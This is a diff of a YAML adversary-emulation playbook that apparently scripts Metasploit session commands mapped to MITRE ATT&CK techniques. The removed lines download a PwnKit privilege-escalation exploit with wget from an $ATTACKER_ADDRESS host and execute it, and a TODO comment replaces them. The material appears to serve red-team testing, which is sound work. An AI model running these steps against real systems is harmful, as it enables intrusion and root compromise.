@@ -156,22 +156,7 @@ commands:
       tactics: "Discovery"
       technique_name: "System Owner/User Discovery"
 
-  - type: msf-session
-    cmd: wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1
-    session: "foothold"
-    end_str: "PWN >"
-    metadata:
-      techniques: "T1105"
-      tactics: "Command and Control"
-      technique_name: "Ingress Tool Transfer"
-
-  - type: msf-session
-    cmd: chmod +x PwnKit && ./PwnKit
-    session: "foothold"
-    metadata:
-      techniques: "T1068"
-      tactics: "Privilege Escalation"
-      technique_name: "Exploitation for Privilege Escalation"
+  # TODO: Implement Polkit privilege escalation
 
   - type: msf-session
     cmd: id
